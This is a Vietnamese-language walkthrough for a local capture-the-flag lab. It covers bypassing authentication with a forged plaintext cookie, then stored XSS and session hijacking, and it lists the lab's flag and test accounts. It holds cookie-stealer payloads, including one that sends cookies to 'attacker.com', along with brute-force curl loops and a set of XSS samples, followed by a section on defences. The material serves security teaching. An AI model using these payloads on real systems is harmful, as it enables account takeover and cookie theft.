# 🔓 Authentication Bypass Lab - Hướng Dẫn

## 🎯 Mục tiêu

Khai thác lỗ hổng cookie không an toàn để bypass authentication và đăng nhập với tài khoản admin.

## 🚀 Truy cập Lab

```
http://localhost:3000/lab/auth
```

## 📝 Các bước thực hành

### Bước 1: Đăng nhập bình thường

Sử dụng tài khoản test:

```
Username: user1
Password: password1
```

Hoặc:

```
Username: user2
Password: password2
```

**Kết quả:** Đăng nhập thành công, thấy bảng tin với comments

### Bước 2: Kiểm tra Cookie

1. Mở **DevTools** (F12)
2. Vào tab **Application** (hoặc **Storage**)
3. Chọn **Cookies** → `http://localhost:3000`
4. Tìm cookie tên **`auth`**

**Phát hiện:** Cookie có giá trị dạng `user1:password1` (plaintext!)

### Bước 3: Phân tích lỗ hổng

Cookie có vấn đề:

-   ❌ Lưu `username:password` rõ ràng
-   ❌ `httpOnly: false` → có thể đọc/sửa bằng JavaScript
-   ❌ Không mã hóa, không hash
-   ❌ Server chỉ parse cookie, không verify với database

### Bước 4: Bypass Authentication

#### Cách 1: Sửa Cookie trong DevTools

1. Trong DevTools, double-click vào giá trị cookie `auth`
2. Sửa thành: `admin:admin123`
3. Refresh trang (F5)

**Kết quả:** Đăng nhập với tài khoản admin!

#### Cách 2: Sử dụng JavaScript Console

Mở Console trong DevTools và chạy:

```javascript
document.cookie = "auth=admin:admin123; path=/";
location.reload();
```

#### Cách 3: Sử dụng curl

```bash
curl -H "Cookie: auth=admin:admin123" http://localhost:3000/lab/auth
```

### Bước 5: Lấy FLAG 🚩

Sau khi đăng nhập với admin:

-   Xem bảng tin
-   Tìm comment từ admin (background vàng)
-   FLAG sẽ ở trong comment của admin

**FLAG:** `FLAG{4uth_Byp4ss_C00k13_H4ck}`

## 🎯 Kỹ thuật Nâng cao: Stored XSS + Session Hijacking

### Bước 6: Stored XSS Attack

**Mục tiêu:** Chèn script vào comment để tấn công những người xem sau

1. Đăng nhập với user1
2. Post comment với payload XSS:

```html
<script>
    alert(document.cookie);
</script>
```

3. Khi admin (hoặc user khác) vào xem comment → Script thực thi!

### Bước 7: Session Hijacking (Đánh cắp Cookie)

**Payload để đánh cắp cookie:**

```html
<script>
    fetch("/api/steal?cookie=" + document.cookie);
</script>
```

**Hoặc với external server:**

```html
<script>
    document.location =
        "http://localhost:3000/api/steal?cookie=" + document.cookie;
</script>
```

**Quy trình tấn công:**

1. Attacker (user1) post comment với XSS payload
2. Admin vào xem comment
3. Script thực thi trên trình duyệt của admin
4. Cookie của admin được gửi đến `/api/steal`
5. Attacker xem log để lấy cookie admin
6. Attacker dùng cookie đó để giả mạo admin

### Bước 8: Xem Stolen Cookies

Sau khi admin vào xem comment, check console của server:

```bash
🚨 STOLEN COOKIE RECEIVED:
Timestamp: 2025-10-16T...
Cookie: auth=admin:admin123
IP: ::1
User-Agent: Mozilla/5.0...
```

Hoặc xem trong bảng comments (sẽ có entry `[HACKER-LOG]`)

## 🧪 Các payload khác

### Đăng nhập với bất kỳ tài khoản nào

```javascript
// Trong Console
document.cookie = "auth=user1:password1; path=/";
document.cookie = "auth=user2:password2; path=/";
document.cookie = "auth=admin:admin123; path=/";
```

### Brute force tìm tài khoản admin

```bash
# Thử các username phổ biến
for user in admin root administrator; do
  for pass in admin admin123 password 123456; do
    curl -s -X POST http://localhost:3000/api/login \
      -H "Content-Type: application/json" \
      -d "{\"username\":\"$user\",\"password\":\"$pass\"}" | grep success
  done
done
```

### Giả mạo cookie bất kỳ

```javascript
// Không cần biết password thật!
document.cookie = "auth=admin:fakepassword123; path=/";
// Vẫn sẽ hiển thị username là "admin"
```

## 🔍 Giải thích kỹ thuật

### Tại sao có lỗ hổng?

**Code trong server.js:**

```javascript
// Login - Set cookie
const authCookie = `${username}:${password}`;
res.cookie("auth", authCookie, { maxAge: 900000, httpOnly: false });

// Verify - Chỉ parse cookie, không check database
const authCookie = req.cookies.auth;
const [username] = authCookie.split(":");
// Sử dụng username mà không verify!
```

❌ **Vấn đề:**

-   Cookie lưu thông tin nhạy cảm dạng plaintext
-   Không verify session với database
-   httpOnly: false → có thể sửa bằng JavaScript
-   Attacker có thể giả mạo cookie bất kỳ

### Cách khai thác:

**Input:** Cookie = `admin:admin123`

**Server xử lý:**

```javascript
const [username] = "admin:admin123".split(":");
// username = "admin"
// Server tin là đã đăng nhập với admin!
```

**Kết quả:** Bypass authentication thành công!

## 🛡️ Cách phòng chống

### ❌ KHÔNG AN TOÀN:

```javascript
// Lưu username:password vào cookie
res.cookie("auth", `${username}:${password}`);
```

### ✅ AN TOÀN hơn - Sử dụng Session:

```javascript
const session = require("express-session");

app.use(
    session({
        secret: "your-secret-key",
        resave: false,
        saveUninitialized: false,
        cookie: {
            httpOnly: true, // Không thể đọc bằng JavaScript
            secure: true, // Chỉ gửi qua HTTPS
            maxAge: 900000,
        },
    })
);

// Login
req.session.userId = user.id;
req.session.username = user.username;

// Verify
if (req.session.userId) {
    // Đã đăng nhập
    // Có thể verify lại với database
}
```

### ✅ TỐT HƠN - JWT (JSON Web Token):

```javascript
const jwt = require("jsonwebtoken");

// Login - Tạo token
const token = jwt.sign(
    { userId: user.id, username: user.username },
    "secret-key",
    { expiresIn: "1h" }
);
res.cookie("token", token, { httpOnly: true });

// Verify - Xác thực token
const token = req.cookies.token;
const decoded = jwt.verify(token, "secret-key");
// decoded.userId, decoded.username
```

### ✅ TỐT NHẤT - Kết hợp nhiều lớp bảo vệ:

```javascript
// 1. Session với database
// 2. JWT với signature
// 3. httpOnly: true
// 4. secure: true (HTTPS)
// 5. SameSite cookie
// 6. CSRF token
// 7. Rate limiting
// 8. Password hashing (bcrypt)
```

## 🎓 Bài tập nâng cao

1. **Thử đăng nhập với username không tồn tại:**

    ```javascript
    document.cookie = "auth=hacker:anypassword; path=/";
    ```

2. **Xem cookie của người khác (XSS):**

    ```javascript
    alert(document.cookie);
    ```

3. **Session fixation:**

    - Set cookie trước khi login
    - Login với tài khoản hợp lệ
    - Cookie vẫn giữ nguyên?

4. **Brute force qua cookie:**
    ```bash
    for i in {1..100}; do
      curl -H "Cookie: auth=user$i:password$i" http://localhost:3000/lab/auth
    done
    ```

## 🎓 XSS Payloads Mẫu

### 1. Basic Alert

```html
<script>
    alert("XSS");
</script>
<script>
    alert(document.cookie);
</script>
```

### 2. Cookie Stealer

```html
<script>
    fetch("/api/steal?cookie=" + document.cookie);
</script>
```

### 3. External Server (Real Attack)

```html
<script>
    var img = new Image();
    img.src = "http://attacker.com/steal?cookie=" + document.cookie;
</script>
```

### 4. Obfuscated XSS

```html
<img src="x" onerror="fetch('/api/steal?cookie='+document.cookie)" />
```

### 5. DOM-based XSS

```html
<svg onload="fetch('/api/steal?cookie='+document.cookie)"></svg>
```

## ⚠️ Nguy hiểm trong thực tế

Nếu có lỗ hổng Authentication Bypass + XSS:

### 1. Account Takeover

```
Attacker giả mạo cookie → Đăng nhập tài khoản nạn nhân
→ Đánh cắp dữ liệu, thay đổi thông tin
```

### 2. Privilege Escalation

```
User bình thường → Sửa cookie thành admin
→ Có quyền admin trên hệ thống
```

### 3. Data Breach

```
Bypass authentication → Truy cập dữ liệu nhạy cảm
→ Tải xuống database, customer info
```

### 4. Session Hijacking (XSS)

```
1. Attacker post XSS payload trong comment
2. Admin vào xem comment → Script thực thi
3. Cookie admin bị đánh cắp
4. Attacker dùng cookie để đăng nhập admin
```

### 5. Mass Account Takeover

```
1. XSS trong trang public (comment, profile)
2. Mọi user vào xem → Cookie bị đánh cắp
3. Attacker có database đầy đủ session tokens
```

## 🔑 Tài khoản hệ thống

| Username | Password  | Role          |
| -------- | --------- | ------------- |
| admin    | admin123  | Administrator |
| user1    | password1 | User          |
| user2    | password2 | User          |

## 💡 Tips

-   Luôn check cookie sau khi login
-   Sử dụng DevTools để debug
-   Thử các giá trị cookie khác nhau
-   Quan sát response từ server
-   Đọc source code để hiểu logic

## 🚩 FLAG

```
FLAG{4uth_Byp4ss_C00k13_H4ck}
```

---

⚠️ **Chỉ sử dụng trong môi trường lab - KHÔNG thử trên hệ thống thực!**
